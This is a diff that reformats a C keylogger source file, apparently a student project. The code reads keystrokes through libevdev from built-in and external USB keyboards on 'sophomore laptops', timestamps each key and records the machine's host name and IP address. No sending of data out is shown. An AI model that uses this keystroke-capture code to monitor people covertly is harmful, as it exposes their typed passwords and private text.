@@ -6,26 +6,25 @@
 
 // for keylogging
 #define _POSIX_SOURCE
+#include <arpa/inet.h>  // display hostname
 #include <ctype.h>
 #include <errno.h>
 #include <fcntl.h>
 #include <libevdev/libevdev.h>
+#include <netdb.h>       // display hostname
+#include <netinet/in.h>  // display hostname
 #include <pthread.h>
 #include <signal.h>
 #include <stdbool.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/types.h>
+#include <sys/socket.h>  // display hostname
 #include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/types.h>  // display hostname
 #include <time.h>
 #include <unistd.h>
-
-#include <netdb.h>  // display hostname
-#include <sys/types.h>  // display hostname
-#include <sys/socket.h>  // display hostname
-#include <netinet/in.h>  // display hostname
-#include <arpa/inet.h>  // display hostname
 
 void begin_keylogger(void) {
   // IMPLEMENTATION HERE
@@ -36,54 +35,47 @@ void end_keylogger(void) {
 }
 
 // Returns hostname for the local computer
-void checkHostName(int hostname)
-{
-	if (hostname == -1)
-	{
-		perror("gethostname");
-		exit(1);
-	}
+void checkHostName(int hostname) {
+  if (hostname == -1) {
+    perror("gethostname");
+    exit(1);
+  }
 }
 
 // Returns host information corresponding to host name
-void checkHostEntry(struct hostent * hostentry)
-{
-	if (hostentry == NULL)
-	{
-		perror("gethostbyname");
-		exit(1);
-	}
+void checkHostEntry(struct hostent* hostentry) {
+  if (hostentry == NULL) {
+    perror("gethostbyname");
+    exit(1);
+  }
 }
 
 // Converts space-delimited IPv4 addresses
 // to dotted-decimal format
-void checkIPbuffer(char *IPbuffer)
-{
-	if (NULL == IPbuffer)
-	{
-		perror("inet_ntoa");
-		exit(1);
-	}
+void checkIPbuffer(char* IPbuffer) {
+  if (NULL == IPbuffer) {
+    perror("inet_ntoa");
+    exit(1);
+  }
 }
 
 void log_device(key_package* key_package) {
   char hostbuffer[256];
-	char *IPbuffer;
-	struct hostent *host_entry;
-	int hostname;
+  char* IPbuffer;
+  struct hostent* host_entry;
+  int hostname;
 
-	// To retrieve hostname
-	hostname = gethostname(hostbuffer, sizeof(hostbuffer));
-	checkHostName(hostname);
+  // To retrieve hostname
+  hostname = gethostname(hostbuffer, sizeof(hostbuffer));
+  checkHostName(hostname);
 
-	// To retrieve host information
-	host_entry = gethostbyname(hostbuffer);
-	checkHostEntry(host_entry);
+  // To retrieve host information
+  host_entry = gethostbyname(hostbuffer);
+  checkHostEntry(host_entry);
 
-	// To convert an Internet network
-	// address into ASCII string
-	IPbuffer = inet_ntoa(*((struct in_addr*)
-						host_entry->h_addr_list[0]));
+  // To convert an Internet network
+  // address into ASCII string
+  IPbuffer = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
 
   // key_package->host_device_name = hostbuffer;
   // key_package->host_device_IP = IPbuffer;
@@ -132,7 +124,8 @@ void log_keys(key_package* key_package) {
   }
 
   // check the 3 USB ports in the event they are external keyboards
-  // On the sophomore laptops, 25 is the bottom right, 27 is the left, and 28 is the top right USB port
+  // On the sophomore laptops, 25 is the bottom right, 27 is the left, and 28 is
+  // the top right USB port
   int external_fd;
   for (size_t i = 0; i < 3; ++i) {
     // TODO: replace with better implementation
@@ -154,7 +147,8 @@ void log_keys(key_package* key_package) {
     // check that the event is a keyboard. If so, exit this loop immediately
     rc = libevdev_new_from_fd(external_fd, &external_keyboard_dev);
     if (rc < 0) {
-      fprintf(stderr, "error with setting rc for %s: %d %s\n", event_path, -rc, strerror(-rc));
+      fprintf(stderr, "error with setting rc for %s: %d %s\n", event_path, -rc,
+              strerror(-rc));
       exit(0);
     }
     // check if the event represents a keyboard
@@ -166,13 +160,13 @@ void log_keys(key_package* key_package) {
       }
     }
 
-    // if this is the third loop and there is no keyboard, set extrenal_fd = NULL
+    // if this is the third loop and there is no keyboard, set extrenal_fd =
+    // NULL
     if (i == 2) {
       printf("No external keyboards found.\n");
       external_fd = NULL;
     }
   }
-
 
   while (1) {
     struct input_event ev;
@@ -196,21 +190,22 @@ void log_keys(key_package* key_package) {
         if (ev.value == 1 || ev.value == 2) {
           // get current time
           time_t rawtime;
-          struct tm * timeinfo;
-          time ( &rawtime );
-          timeinfo = localtime ( &rawtime );
+          struct tm* timeinfo;
+          time(&rawtime);
+          timeinfo = localtime(&rawtime);
 
-          // make key struct, add to key package. do the file writing in another file
+          // make key struct, add to key package. do the file writing in another
+          // file
           key_info pressed_key = {
-            .key = libevdev_event_code_get_name(ev.type, ev.code),
-            .timestamp = asctime(timeinfo)
-          };
+              .key = libevdev_event_code_get_name(ev.type, ev.code),
+              .timestamp = asctime(timeinfo)};
 
           // append to key_package->keys
           key_package->keys[key_package->keys_arr_size] = pressed_key;
           key_package->keys_arr_size++;
 
-          // printf("New key_package array size: %ld\n", key_package->keys_arr_size);
+          // printf("New key_package array size: %ld\n",
+          // key_package->keys_arr_size);
         }
       }
     } else {
